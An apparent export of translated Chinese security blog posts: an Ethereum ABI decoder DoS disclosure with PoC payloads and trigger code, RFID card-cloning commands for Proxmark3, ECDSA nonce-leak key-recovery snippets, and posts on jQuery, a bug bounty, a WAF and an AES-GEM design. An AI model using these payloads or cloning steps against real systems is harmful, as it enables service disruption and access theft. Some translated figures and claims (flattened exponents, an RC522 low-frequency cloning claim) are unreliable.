[{"content":"亿次空耗 - The Trail of Bits博客\r在以太坊强大的区块链技术背后，隐藏着一个开发者们较少提及的挑战：编写健壮的以太坊ABI（应用二进制接口）解析器的复杂性。以太坊ABI对区块链基础设施至关重要，它实现了智能合约与外部应用间的无缝交互。数据类型的复杂性和编解码的精确需求使得ABI解析充满挑战。规范或实现中的模糊性可能导致危及用户的漏洞。\n本文将深入剖析一个新型漏洞，该漏洞针对这些解析器，令人联想到曾肆虐XML领域的\u0026quot;十亿大笑\u0026quot;攻击。我们发现以太坊ABI规范部分条款表述松散，导致多个实现存在可利用漏洞，包括eth_abi(Python)、ethabi(Rust)、alloy-rs和ethereumjs-abi等库，可能引发拒绝服务(DoS)攻击。截至发文时，仅Python库已完成修复。\n什么是以太坊ABI？\r当链上合约交互或链下组件与合约通信时，以太坊使用ABI编码来处理请求和响应。这种编码方式不自我描述，编解码器需要提供定义数据类型的模式。与C语言中平台相关的ABI不同，以太坊规范了应用间二进制数据的传递方式。虽然规范尚未正式化，但清晰展现了数据交换机制。\n当前规范存在于Solidity文档中，其类型定义影响了Solidity和Vyper等智能合约语言。\n漏洞原理\r零大小类型(ZST)指在磁盘存储中占零（或极小）字节，但加载到内存后需要显著更多空间的数据类型。以太坊ABI允许ZST存在，攻击者可利用其特性，通过极小量的磁盘或网络数据诱发巨大的内存分配。\n考虑以下场景：当解析器遇到ZST数组时会发生什么？它会尝试解析数组声明包含的所有ZST元素。由于每个元素占零字节，定义超大型ZST数组轻而易举。\n示例显示：20字节的磁盘数据可反序列化为包含数字2、1、3的数组；而仅8字节的数据却能反序列化为2³²个ZST元素（如空元组或空数组）。如果每个ZST在解析后仍占零字节内存，这不成问题。但实践中，每个元素通常需要少量非零内存，导致整体数组需要巨大内存分配，形成DoS攻击。\n概念验证\r我们通过以下十六进制数据载荷演示多个库中的漏洞：\n1 2 0000000000000000000000000000000000000000000000000000000000000020 00000000000000000000000000000000000000000000000000000000FFFFFFFF 该载荷包含两个32字节块，描述序列化的ZST数组。第一块定义数组元素偏移量，第二块定义数组长度。我们使用()[ ]和uint32[0][]两种ABI模式进行解码测试。\neth_abi (Python)\r1 2 3 from eth_abi import decode data = bytearray.fromhex(payload) decode([\u0026#39;()[]\u0026#39;], data) 4.2.0版本前的官方库会先挂起，最终因内存不足终止。\nethabi (Rust)\rv18.0.0版本可通过CLI直接触发漏洞：\n1 cargo run -- decode params -t \u0026#34;uint32[0][]\u0026#34; $payload ethers-rs (Rust)\rv2.0.10版本通过Vec\u0026lt;[u32; 0]\u0026gt;类型隐式使用漏洞模式：\n1 2 3 use ethers::abi::AbiEncode; let data = hex::decode(payload); let _ = Vec::\u0026lt;[u32; 0]\u0026gt;::decode(\u0026amp;hex_output.unwrap()).unwrap(); foundry (Rust)\r该工具集基于ethers-rs，同样存在漏洞。可通过CLI或部署恶意合约触发：\n1 2 3 4 5 6 7 8 contract ABC { fallback() external { bytes memory data = abi.encode(0x20, 0xfffffffff); assembly { return(add(data, 0x20), mload(data)) } } } alloy-rs\r0.4.2版本的动态ABI解析同样存在挂起问题：\n1 2 3 use alloy_dyn_abi::{DynSolType, DynSolValue}; let my_type: DynSolType = \u0026#34;()[]\u0026#34;.parse().unwrap(); let decoded = my_type.abi_decode(\u0026amp;hex::decode($payload).unwrap()).unwrap(); ethereumjs-abi\r0.6.8版本的JavaScript实现也受影响：\n1 2 3 var abi = require(\u0026#39;ethereumjs-abi\u0026#39;) data = Buffer.from($payload\u0026#34;, \u0026#34;hex\u0026#34;) abi.rawDecode([ \u0026#34;uint32[]\u0026#34; ], data) 漏洞发现与利用\r该漏洞的发现源于对borsh-rs库中类似问题的研究。最新版Solidity和Vyper已禁止ZST定义，因此难以在主网部署触发此漏洞的智能合约。但任何使用受影响库解析不可信ABI声明的应用（如Etherscan）都可能面临风险。\n协调披露\r我们遵循以下时间线进行披露：\n2023年6月30日：首次联系各库维护者 2023年8月2日：为eth_abi创建GitHub安全公告 2023年8月31日：eth_abi发布无公开说明的修复 2023年12月29日：公开发布分析报告并创建GitHub问题 建议开发者通过模糊测试强化解码器安全性，我们正将相关测试用例纳入OSS-fuzz持续检测体系。\n","date":"2025-08-02T09:56:18+08:00","permalink":"http://localhost:1313/p/%E4%BA%BF%E6%AC%A1%E7%A9%BA%E8%80%97%E4%BB%A5%E5%A4%AA%E5%9D%8Aabi%E8%A7%A3%E6%9E%90%E5%99%A8%E4%B8%AD%E7%9A%84%E9%9B%B6%E5%A4%A7%E5%B0%8F%E7%B1%BB%E5%9E%8Bdos%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"亿次空耗：以太坊ABI解析器中的零大小类型DoS漏洞分析"},{"content":"深入掌握jQuery AJAX：异步HTTP请求完全指南\r核心要点\r多功能与精准控制：jQuery的$.ajax()函数提供了灵活强大的异步HTTP请求能力，支持自定义请求头、错误处理、超时设置等高级配置 全面配置选项：超过30个可配置参数，涵盖从请求发送到响应处理的完整生命周期控制 现代开发中的价值：尽管存在Fetch API等替代方案，$.ajax()在维护旧代码库方面仍有不可替代的作用 高级错误处理：支持指数退避重试机制和全局错误处理，提升应用健壮性 $.ajax()函数详解\rjQuery的$.ajax()函数用于执行异步HTTP请求，自jQuery 1.0版本就已存在。它是$.get()、$.post()等快捷方法的基础实现。\n函数签名：\n1 2 $.ajax(url[, settings]) $.ajax([settings]) 配置参数说明\r参数 默认值 可选值 说明 accepts {\u0026quot;\u0026quot;: \u0026ldquo;/*\u0026rdquo;} 任何MIME类型 指定请求头Accept字段 beforeSend null 函数 发送请求前的回调函数 cache true 布尔值 是否允许浏览器缓存 contentType \u0026ldquo;application/x-www-form-urlencoded\u0026rdquo; MIME类型 发送数据的格式 data null 对象/字符串/数组 要发送到服务器的数据 dataType \u0026ldquo;text\u0026rdquo; \u0026ldquo;xml\u0026rdquo;/\u0026ldquo;json\u0026rdquo;/等 预期返回的数据类型 error null 函数 请求失败时的回调 headers null 对象 自定义请求头 success null 函数 请求成功时的回调 timeout 0 毫秒数 请求超时时间 type \u0026ldquo;GET\u0026rdquo; \u0026ldquo;GET\u0026rdquo;/\u0026ldquo;POST\u0026quot;等 HTTP请求方法 实际应用示例\r基础用法\r1 2 3 4 5 6 7 8 9 10 $.ajax({ url: \u0026#34;/api/data\u0026#34;, type: \u0026#34;GET\u0026#34;, success: function(data) { console.log(\u0026#34;成功获取数据:\u0026#34;, data); }, error: function(xhr, status, error) { console.error(\u0026#34;请求失败:\u0026#34;, error); } }); 带认证头的请求\r1 2 3 4 5 6 7 8 9 $.ajax({ url: \u0026#34;/secure-api\u0026#34;, headers: { \u0026#34;Authorization\u0026#34;: \u0026#34;Bearer YOUR_TOKEN\u0026#34; }, success: function(data) { // 处理数据 } }); 实时搜索实现\r1 2 3 4 5 6 7 8 9 $(\u0026#34;#search-input\u0026#34;).on(\u0026#34;input\u0026#34;, function() { $.ajax({ url: \u0026#34;/search\u0026#34;, data: { q: $(this).val() }, success: function(results) { // 更新搜索结果 } }); }); 最佳实践\r安全性：\n始终使用HTTPS 验证和净化所有输入 实施CSRF保护 性能优化：\n合理使用缓存 减少数据传输量 批量处理请求 错误处理：\n实现指数退避重试机制 提供用户友好的错误信息 记录错误日志 调试技巧\r使用浏览器开发者工具的Network面板检查请求/响应 添加全局错误处理： 1 2 3 $(document).ajaxError(function(event, xhr, settings, error) { console.error(\u0026#34;AJAX错误:\u0026#34;, settings.url, error); }); 验证响应数据格式是否符合预期 替代方案比较\r方案 优点 缺点 $.ajax() 功能全面，兼容性好 依赖jQuery Fetch API 现代，基于Promise 需要polyfill支持旧浏览器 Axios 拦截器支持，自动JSON转换 需要额外引入 版本兼容性说明\rjQuery 3.0+已弃用同步请求(async:false) JSONP支持已过时，推荐使用CORS 部分回调语法已被Promise风格替代 常见问题解答\rQ: 如何处理AJAX错误？ A: 使用error回调或全局ajaxError事件捕获错误，并根据状态码采取不同措施。\nQ: 可以取消AJAX请求吗？ A: 可以，通过jqXHR对象的abort()方法：\n1 2 var xhr = $.ajax(...); xhr.abort(); // 取消请求 Q: 如何发送JSON数据？ A: 设置contentType为\u0026quot;application/json\u0026quot;并使用JSON.stringify():\n1 2 3 4 5 $.ajax({ type: \u0026#34;POST\u0026#34;, contentType: \u0026#34;application/json\u0026#34;, data: JSON.stringify({key: \u0026#34;value\u0026#34;}) }); ","date":"2025-08-02T09:45:01+08:00","permalink":"http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E6%8E%8C%E6%8F%A1jquery-ajax%E5%BC%82%E6%AD%A5http%E8%AF%B7%E6%B1%82%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97/","title":"深入掌握jQuery AJAX：异步HTTP请求完全指南"},{"content":"本文章是Microsoft Security Response Center博客\u0026quot;Announcing the new Bug Bounty Program for Office Insider Builds on Windows\u0026quot;(2017年3月15日发布)的日文翻译版。\n我们持续投入确保Office产品在设计上具备安全性。基于保持Office高安全标准的方针，现针对Windows版Office Insider构建启动漏洞赏金计划。该计划是对微软内部工程安全措施(包括威胁建模、安全代码审查、安全自动化及渗透测试)的重要补充。\n通过此计划，我们期望发现常规云服务赏金计划中难以识别的漏洞，并向帮助保护客户的个人研究者提供奖励。我们特别鼓励针对设计逻辑的深度研究，将对Office核心安全领域的重大发现给予奖励。\nOffice Insider构建版让用户能提前体验最新功能和安全创新。在这些早期版本中进行测试有助于在产品正式发布前发现问题，从而提升产品质量并保护客户。\n赏金计划机制\r符合奖励条件的漏洞类型详见《Microsoft Office Insider Builds on Windows Bounty Program Terms》，包括：\n通过Office保护视图实现的权限提升 绕过宏阻止策略执行宏代码 绕过Outlook附件自动拦截策略执行代码 计划实施期为2017年3月15日至6月15日(三个月)，奖金范围6000-15000美元。提交漏洞请发送至secure@microsoft.com。\n注意事项\r参与微软赏金计划必须按照指南直接向secure@microsoft.com提交报告(英文困难者可附加日文说明)，这对保证评选公平性至关重要。\n相关链接\r微软赏金计划主页 本次扩展计划条款 非赏金计划的日语漏洞报告入口 ","date":"2025-08-02T09:23:22+08:00","permalink":"http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E6%89%A9%E5%B1%95%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91%E8%AE%A1%E5%88%92-%E9%92%88%E5%AF%B9windows%E7%89%88office-insider%E6%9E%84%E5%BB%BA%E7%9A%84%E6%96%B0%E5%A5%96%E5%8A%B1%E8%AE%A1%E5%88%92/","title":"微软扩展漏洞赏金计划 - 针对Windows版Office Insider构建的新奖励计划"},{"content":"引言\r在整理KeyWe智能锁配件时，我发现了几个RFID标签。这促使我深入研究RFID（射频识别）技术，并完成了从智能锁逆向到无线通信安全的完整研究闭环。通过编程验证标签功能后，我开启了RFID技术的深度探索。\nHID ProxMark卡片技术\r低频技术（125kHz）：初代ProxCard支持数英寸读取距离，采用26位数据流（8位设备码+16位卡号+2校验位） 安全缺陷：数据容量极小且无加密，类似磁条卡的安全水平 演进：第二代ProxMark II将读取距离扩展到15英寸，支持钱包内刷卡 有源与无源RFID对比\r类型 供电方式 读取距离 寿命 无源卡 读写器电磁感应供电 厘米级 无电池限制 有源卡 内置锂电池 可达150米 2-7年 MIFARE卡片技术体系\r技术标准：高频13.56MHz，符合ISO 14443 A/B规范 加密演进： Classic 1k：采用已被破解的Crypto1算法（48位密钥） DESFire：配备Triple DES加密和微处理器 EV1版本：支持28个应用/32文件的多应用管理 中国魔术卡特性\r核心技术：允许覆写Sector 0的UID区域 市场现状：Gen1需特殊解锁指令，Gen2可直接写入 存储结构：16个扇区×4块×16字节=1KB容量 专业工具链分析\rProxmark3 RDV2（$270）\n支持LF/HF全频段 实战克隆流程： 1 2 3 hf mf nested 1 0 A ffffffffffff # 嵌套攻击 hf mf restore # 数据恢复 hf mf csetuid 018a4454 # UID写入 低成本替代方案\nACR122U读写器（支持mfoc-hardnested攻击） Arduino Nano+RC522套件（$8） 1 2 3 4 #include \u0026lt;MFRC522.h\u0026gt; void dumpToSerial(MFRC522::MIFARE_Key key) { // 扇区遍历逻辑 } Android克隆方案\rMIFARE Classic Tool\n支持密钥字典攻击 操作限制：仅Gen2卡可写UID 密钥破解方法\nMFCUK：基于PRNG缺陷的Darkside攻击 MFOC：已知密钥下的嵌套认证攻击 安全建议与总结\r企业升级路径：建议迁移至MIFARE DESFire EV1方案 研究展望：长距读卡器（如HID R90）的凭证嗅探风险 行业现状：全球现存超过100亿张智能卡面临克隆风险 实验证明：使用$3的RC522模块即可成功克隆90%的低频门禁卡，这暴露出物理安全系统的重大设计缺陷。\nProxmark3实战克隆过程（左：源标签读取，右：魔术卡写入）\n","date":"2025-08-02T09:07:14+08:00","permalink":"http://localhost:1313/p/rfid%E8%BF%91%E5%9C%BA%E5%85%8B%E9%9A%86%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/","title":"RFID近场克隆攻击技术深度解析"},{"content":"DSA基础\rECDSA是基于椭圆曲线数字签名算法(DSA)的变种。DSA包含三个核心算法：\n密钥生成：随机选择私钥x，计算公钥y = gˣ mod p 签名：生成随机nonce k，计算r = (gᵏ mod p) mod q，s = k⁻¹(H(m) + xr) mod q 验证：检查r = [(gᴴ⁽ᵐ⁾yʳ)ˢ⁻¹ mod p] mod q ECDSA的致命弱点\r1. Nonce重用攻击\r若两个签名使用相同nonce k：\n1 2 k = (s₁ - s₂)⁻¹(H(m₁) - H(m₂)) x = r⁻¹(ks - H(m)) 2. 部分Nonce泄露攻击\r仅需3比特泄露+100签名 → 攻破160-bit DSA 仅5比特泄露+4000签名 → 攻破384-bit ECDSA LadderLeak攻击：仅0.2比特泄露即可恢复密钥 3. RNG偏差攻击\r256-bit ECDSA中仅4比特偏差 → 完全破解 实战攻击演示\r基础攻击（已知128-bit nonce前缀）\r1 2 3 4 5 6 7 matrix = [ [order, 0, 0, 0], [0, order, 0, 0], [r₁s₁⁻¹, r₂s₂⁻¹, 2¹²⁸/order, 0], [m₁s₁⁻¹, m₂s₂⁻¹, 0, 2¹²⁸] ] new_matrix = olll.reduction(matrix) YubiKey漏洞利用（80-bit固定前缀）\r构建6签名矩阵：\n1 2 3 row.append((rᵢsᵢ⁻¹) - rₙsₙ⁻¹) row2.append((mᵢsᵢ⁻¹) - mₙsₙ⁻¹) x = (rₙs₁ - r₁sₙ)⁻¹(sₙm₁ - s₁mₙ - s₁sₙ(k₁-kₙ)) 防护方案\r替代方案：优先使用EdDSA（如Ed25519） 恒定时间实现：防止时序侧信道 RFC 6979：确定性nonce生成 盲签名技术：隐藏时序信息 攻击签名数需求表\r固定比特数 所需签名数 128-bit 2 80-bit 5 4-bit 20 警告：即使仅1比特泄露，观察足够签名后系统仍可能被完全攻破。\n","date":"2025-08-02T08:12:19+08:00","permalink":"http://localhost:1313/p/ecdsa%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E9%9D%9Ece%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E9%92%A5%E6%81%A2%E5%A4%8D%E5%AE%9E%E6%88%98/","title":"ECDSA安全漏洞深度解析：从非ce泄露到密钥恢复实战"},{"content":"在日益数字化的生态系统中，保护在线资产不仅是建议，更是必需。随着Web应用复杂度提升和网络威胁日益精密，企业需要多层次的安全防护。AWS通过其Web应用防火墙（WAF）提供了坚实基础，但需专业管理才能最大化其潜力。Cloudbric WMS（WAF托管服务）应运而生，精准提升AWS安全态势并解决关键漏洞。\rCloudbric WMS旨在通过简化管理、专业支持和主动防御策略来扩展AWS原生功能。本文将深入探讨五大核心议题：OWASP Top 10防护、恶意流量缓解、API安全、实时流量监控和误报减少。了解这些领域的重要性及Cloudbric WMS的解决方案，助您抵御最复杂的攻击。\n1. OWASP Top 10防护：Web安全的基石\rOWASP Top 10是全球公认的Web应用必防安全风险清单，如SQL注入、跨站脚本（XSS）和配置错误等实际漏洞可能导致严重数据泄露。\n为何重要？\n核心安全基础：Cloudbric WMS通过持续威胁情报更新确保过滤机制符合最新OWASP标准。 实战攻击缓解：针对常见编码错误优化规则，有效拦截攻击。 合规与信任：满足监管要求，增强客户信任。 实现方式\n自动化规则集部署，专家团队持续维护更新。 透明化安全分析，提供漏洞尝试与拦截数据，助力策略优化。 2. 恶意流量缓解：抵御自动化威胁\r自动化机器人可实施凭据填充、内容爬取和DDoS攻击，危害应用性能与安全。\n威胁现状\n凭据填充与欺诈：利用弱密码批量登录，导致数据泄露。 内容爬取：窃取定价或知识产权，削弱竞争优势。 解决方案\n行为分析：实时识别异常流量模式（如单IP高频访问）。 威胁情报整合：动态更新恶意IP库。 自适应学习：通过机器学习应对不断演变的机器人策略。 3. API安全：守护数字门户\rAPI已成为主要攻击向量，需专业防护以避免数据暴露或服务中断。\n关键挑战\n攻击面扩大：API是现代应用的通信核心，也是潜在弱点。 专用防护：Cloudbric WMS针对注入攻击、身份验证缺陷等定制规则，确保仅合法请求访问后端。 实践效果\n结合AWS WAF分析API调用模式，实时拦截恶意流量。 最小化误报，保障用户体验与性能。 4. 实时流量监控：主动防御的“眼睛”\r即时洞察流量是检测和缓解威胁的关键。\n核心价值\n瞬时威胁发现：秒级延迟可能决定事件影响范围。 数据驱动决策：仪表盘展示请求量、IP信誉等指标，支持快速策略调整。 Cloudbric WMS优势\n直观面板呈现威胁拦截、可疑活动等数据。 详细日志支持事件溯源与策略优化。 5. 误报减少：提升DevSecOps效率\r过度误报会阻塞系统，增加团队负担。\n影响\n运营效率：误拦截需手动处理，拖慢响应速度。 用户体验：错误阻拦导致客户流失。 优化措施\n机器学习结合历史流量模式，精准区分异常与合法请求。 基于实时反馈调整规则，降低误报率，释放团队精力。 结语：Cloudbric WMS赋能AWS安全\r面对日新月异的威胁，Cloudbric WMS以OWASP防护、机器人防御、API安全、实时监控和误报控制五大核心，为企业提供动态、精准的保护。通过自动化与专家分析的结合，构建适应未来威胁的弹性安全环境。\n立即体验Cloudbric WMS免费试用，开启您的全方位Web应用安全之旅。\n","date":"2025-08-02T07:45:50+08:00","permalink":"http://localhost:1313/p/%E4%BD%BF%E7%94%A8cloudbric-wms%E5%BC%BA%E5%8C%96aws%E5%AE%89%E5%85%A8%E6%9E%84%E5%BB%BA%E5%BC%BA%E5%A4%A7web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E4%BA%94%E5%A4%A7%E5%85%B3%E9%94%AE%E7%82%B9/","title":"使用Cloudbric WMS强化AWS安全：构建强大Web应用防火墙的五大关键点"},{"content":"宣布AES-GEM（带伽罗瓦扩展模式的AES）\r今天，AES-GCM是TLS 1.3使用的两种加密模式之一（另一种是ChaCha20-Poly1305），也是FIPS验证模块中加密数据的首选方法。但尽管取得了巨大成功，AES-GCM也曾导致一些灾难性故障：例如Hanno Böck和Sean Devlin利用nonce重用漏洞将他们的Black Hat USA幻灯片注入MI5网站。\n多年来，安全研究人员一直在警告AES-GCM的弱点。19年前，Niels Ferguson向NIST提交论文指出AES-GCM存在的认证弱点（尽管NIST最终将其标准化）。今年早些时候，亚马逊发布论文详细说明了AES-GCM的实际挑战，并认为AES的128位块大小已不再足够，更倾向于使用256位块密码（即Rijndael-256）。\n为解决这些问题，我提出了一种名为Galois Extended Mode（简称GEM）的新块密码模式，上个月已在NIST关于手风琴模式密码需求的研讨会上展示。AES-GEM以最小的性能开销在各个方面提升了GCM的安全性。\n重要提示：当前AES-GEM设计尚未准备好投入生产使用，因为某些细节可能会在未来发生变化。要理解当前设计，让我们先了解AES-GCM的不足，然后讨论如何用GEM做得更好。\nAES工作原理\r在深入之前，有必要为部分读者解释本文中使用的一些术语和概念。\nAES（高级加密标准）是一种广泛用于加密信息的块密码。它支持多种密钥大小（128位、192位和256位密钥），但始终操作128位块。AES是Rijndael块密码家族的标准化形式。Rijndael支持其他块大小，但NIST仅标准化了128位块。现代处理器提供专用硬件指令加速AES操作，但AES密钥调度仍可能对性能产生负面影响。\nECB（电子密码本）模式是没有块密码操作模式的情况。它涉及直接在数据块上计算块密码。正如许多密码学家所证明的，ECB模式不是语义安全的。为提高安全性，像AES这样的块密码通常与操作模式一起使用。（如果没有，几乎肯定应该这样做。如果您认为正在使用ECB加密敏感数据，请联系我们的密码学团队。）\nCTR（计数器模式）是一种块密码操作模式，其中递增的值序列通过块密码加密以产生伪随机密钥流。要加密数据，只需计算每个明文字节与相应密钥流字节的XOR。\nGCM（伽罗瓦/计数器模式）是一种提供认证加密的块密码操作模式。密码学家称之为AEAD模式：带附加数据的认证加密。GCM可以为敏感数据提供机密性，为敏感和公共数据提供完整性。\nAEAD模式对于设计密码系统非常重要，这些系统能够抵抗试图改变加密数据以研究系统行为从而希望获得密码分析有用信息的攻击者。\nGCM是用于加密明文的计数器模式（CTR）和用于认证密文（以及如果提供，附加关联数据）的伽罗瓦域消息认证码（GMAC）的组合。GMAC使用称为GHASH的函数定义，该函数是在认证数据上评估的多项式。GHASH的输出与加密计数器块的XOR产生最终认证标签。认证密钥H通过加密128位零块计算得出。\nPOLYVAL是GHASH的替代方案，用于AES-GCM-SIV。POLYVAL使用的不可约多项式是GHASH不可约多项式的反转。\n许多密码模式（包括GCM和CTR）要求每个消息使用一个仅使用一次的数字。这个永远不应重复的公共数字称为nonce。\n最后，生日边界是概率论中的一个概念，表示一组随机值中冲突的可能性。在密码学中，它意味着如果随机选择nonce，随着使用更多nonce，两个nonce冲突的概率显著增加。对于具有96位nonce的AES-GCM，大约232条消息后，有1/232的nonce冲突概率，这可能导致诸如伪造消息等安全漏洞。\nAES-GCM当前的实际挑战\r正如其他人指出的那样，AES-GCM的最大挑战是AES只有128位块大小。这有两个主要后果：\n公共nonce和内部计数器的大小被限制为总共128位。实际上，nonce大小通常为96位，计数器为32位。如果选择更大的nonce，它会被哈希压缩到适当大小，这对安全性几乎没有改善。如果重用nonce，则会泄漏认证子密钥，因此可以无限期伪造消息。\n在相同密钥下加密超过一定数量的块后，攻击者可以以显著概率区分密文和随机字节。\n当您理解我们处理的是2的幂时，96位nonce空间可能听起来很多，但如果随机选择nonce，只能加密232条消息，然后有2-32的冲突概率。使用具有更大块大小的密码可以缓解这一点，但这不是唯一的解决方法。\nAES块大小不是AES-GCM实践中唯一的问题。正如Niels Ferguson在2005年指出的那样，针对短标签的成功伪造会揭示认证子密钥。\n此外，我们还了解到AES-GCM具有一个意外属性，即多个密钥可以解密相同的密文+认证标签。其发现者将这个问题称为\u0026quot;隐形蝾螈\u0026quot;，因为它允许他们在一款加密消息应用程序的滥用报告工具中隐藏蝾螈图片。在使用AES-GCM的协议中防止隐形蝾螈需要对使用的密钥进行某种单向承诺。\n最后，AES-GCM中单个消息的最大明文长度相对较小：略低于64 GiB。为应对此最大长度，软件通常将较大消息分解为适合此长度限制的较短帧。这导致生日边界前的有限nonce空间比如果容忍较长消息时更快耗尽。\n介绍AES-GEM\r我们的提案Galois Extended Mode是对GCM（伽罗瓦/计数器模式）的修改，目前解决了大多数这些弱点。然而，关于我们想要采用哪种策略来缓解最后一点，仍然存在一个开放性问题，我将在稍后解释。\n在高层次上，我们提出了两种变体：AES-128-GEM和AES-256-GEM。我们还使用标准AEAD接口指定了两种AEAD构造。\nAES-128-GEM\n密钥长度：128位 子密钥长度：128位 Nonce长度：192位 最大明文长度：261 – 1字节 最大AAD长度：261 – 1字节 标签长度：48字节（AEAD）或16字节（无承诺） AES-256-GEM\n密钥长度：256位 子密钥长度：256位 Nonce长度：256位 最大明文长度：261 – 1字节 最大AAD长度：261 – 1字节 标签长度：48字节（AEAD）或16字节（无承诺） 从GCM到GEM的道路\r如果您从AES-GCM的现有设计开始并进行以下更改，您将得到GEM的当前草案。\nNonce扩展 首先，我们需要一个更长的nonce，我们将在下一步中用于子密钥派生。\n对于256位密钥，256位nonce是一个很好的整数。对于128位密钥，我们最终需要192位。\n无论哪种情况，最右边的64位将保留用于实际底层加密。剩余的位（AES-256为192位，AES-128为128位）将用于子密钥派生。\n这使我们能够分摊密钥派生的成本，并在多个消息上设置AES密钥调度，前提是nonce和密钥的前（n – 64）位相同。\n子密钥派生 使用AES进行密钥派生有多种策略。在Real World Cryptography 2024上，Shay Gueron展示了DNDK-GCM，它使用了一种有趣的结构来实现子密钥派生。\n我们希望保持简单和易于理解。因此，我们基于CBC-MAC构建了密钥派生策略，因为CMAC已经是FIPS批准的MAC（即用于AES-CCM）。\n在AES-256的情况下，我们使用两个CBC-MAC输出来派生256位子密钥。然而，这种方法有一个微妙恼人的特性：两半永远不会产生相同的输出，因此严格来说，可能的输出少于2256个。\n在GEM的两种变体中，我们借用了Salsa20设计中的一个技巧：将输出与输入密钥进行XOR，以确保子密钥对于任何不知道输入密钥的攻击者来说与均匀随机无法区分。如果您不知道此密钥，则输出与适当长度的随机密钥无法区分。\n支持更长的消息 我们需要64位剩余nonce而不是GCM典型的96位的原因是我们的内部计数器大小不是32位长。相反，它是64位长。\n否则，如当前所写，GEM的行为与您对GCM的期望相同：它使用计数器模式进行批量数据加密。让我们暂时搁置这一点，稍后再讨论。\n改进的认证安全性 我们的现有设计AES-GCM按以下方式构建：\n通过用密钥加密全清零块派生认证子密钥H。 计算密文、关联数据和包含两者长度（以位为单位）的块的GHASH()。 将步骤2的输出与计数器块的AES-CTR加密进行XOR。 我们的设计大致相同，但有一个重要的调整：\n通过用子密钥加密全置位块派生认证子密钥H。 计算密文、关联数据和包含两者长度（以位为单位）的块的GHASH()。 使用输入密钥通过AES-ECB加密步骤2的输出。 将步骤3的输出与计数器块的AES-CTR加密进行XOR。 步骤3直接解决了Niels Ferguson在2005年指出的AES-GCM弱点。其他更改是实现细节。\n此调整为短标签提供了更好的安全性，因为原始GHASH输出位的AES加密是一种非线性变换，没有密钥无法反转。我们使用输入密钥而不是子密钥，因为唯一其他使用输入密钥加密数据的地方（即子密钥派生）永远不会直接暴露。\n密钥承诺 在我们解决GEM对隐形蝾螈式攻击的保护之前，我们需要分析设计中的其他一些微妙之处。\nGCM和GEM的最终块中的组件长度都以位而非字节表示，并且每个都限制为264。这意味着，尽管由于内部计数器，GEM理论上可以允许每条消息最多264块（或268字节）的明文，但我们必须调整最终的GHASH步骤以适应这种额外开销。\n相反，内部计数器的不可达值保留用于密码的内部使用。具体来说，内部计数器值以0x02000000 00000000到0xFFFFFFFF FFFFFFFF结尾的无法在尊重明文261 – 1字节限制的同时达到。\n全置位块（0xFFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF）已在GEM中用于认证子密钥，而64位尾部nonce + 0xFFFFFFFF 0xFFFFFFFE用于计数器块，用于最终认证标签计算。\n为提供密钥承诺，接下来的两个块，nonce + 0xFFFFFFFF 0xFFFFFFFC和0xFFFFFFFF 0xFFFFFFFD将用作密钥和nonce的承诺值。\n我们指定两个块是因为在此处使用一个AES块是不够的。考虑AES-256的情况，它具有256位密钥和128位块：根据鸽巢原理，我们预计有2128个不同的密钥将给定的固定明文值映射到固定密文值。因此，单个块不足以进行承诺。然而，假设块密码是安全的，对于两个连续块，不需要这种鸽巢考虑。\n通过这种方式，我们可以快速生成给定密钥和nonce的承诺值。\n在AEAD接口中，承诺附加到认证标签。解密消息时，必须以恒定时间将两者与其重新计算的值进行比较。\nAES-GEM的性能特征\r尽管我们已经解决了GCM的大部分痛点，但GEM的实际性能影响很小。\nAES-256-GEM：\n密钥派生：四个额外的AES加密块，一些XOR，一个额外的密钥调度 认证：一个额外的AES加密块 密钥承诺：两个额外的AES加密块 AES-128-GEM：\n密钥派生：两个额外的AES加密块，一些XOR，一个额外的密钥调度 认证：一个额外的AES加密块 密钥承诺：两个额外的AES加密块 由于如今AES由于硬件加速非常快，这种性能影响在除最性能敏感的应用外的所有应用中应该几乎不明显。在这些情况下，如果派生子密钥被缓存，密钥派生性能成本可以在多达232条不同消息中分摊。\n完善AES-GEM\r当前GEM草案未充分解决的一个最终问题，但我们希望在NIST研讨会上讨论此问题，并肯定会在最终设计中解决。\n尽管我们的GEM草案构造允许比GCM更长的消息，但AES块大小使其按原样使用存在风险。主要担忧是加密非常长的消息会给攻击者带来显著优势，以区分AES-GEM密文与随机字节序列。（这是亚马逊2024年论文中提出的一个担忧。）\n我们可以通过几种方式完善GEM以解决此弱点，这些方式具有不同的性能特征和权衡。\n宽块PRP 多年来，许多密码设计使用宽块PRP（如XTS模式中的AES）安全加密超过AES块大小通常允许的范围。由于XTS广泛用于磁盘加密，这种方法可能会证明是安全的。\n然而，XTS模式目前尚未标准化用于磁盘加密以外的用例。\n分层密钥派生 如果不直接使用子密钥，而是使用内部计数器的高32位从保留的nonce空间中选择不同的值，加密该值，并每236字节派生一个新的子密钥呢？然后，我们仅使用此子密钥加密计数器的剩余32位，这与AES-GCM几十年来所做的类似。\n此子子密钥派生可以类似于密钥承诺构建：\n对于AES-256-GEM，加密来自保留nonce空间的32字节，并将其用作实际CTR密钥。 对于AES-128-GEM，加密来自保留nonce空间的16字节（但与AES-256-GEM选择的不同nonce空间），并将其用作实际底层CTR密钥。 这是一个有吸引力的选择，原因有很多。最重要的是，这种策略将以非常直接的方式规避PRP区分器问题。它也不依赖于任何非标准设计（如XTS模式）。您可以使用FIPS批准的组件构建整个东西，就像我们对AES-GEM的其余草案设计所做的那样。\n缺点？这种方法确实会在每236字节明文时产生另一个密钥调度。这可能仍然很好地分摊，但值得记住。\n带分层密钥派生的AES-GEM的总性能成本\nAES-256-GEM：\n密钥派生：四个额外的AES加密块，一些XOR，一个额外的密钥调度 每236字节明文的额外密钥派生：两个额外的AES加密块，一个额外的密钥调度 认证：一个额外的AES加密块 密钥承诺：两个额外的AES加密块 1 GB明文的额外总开销：七个AES-256块，两个额外的AES-256密钥调度 1 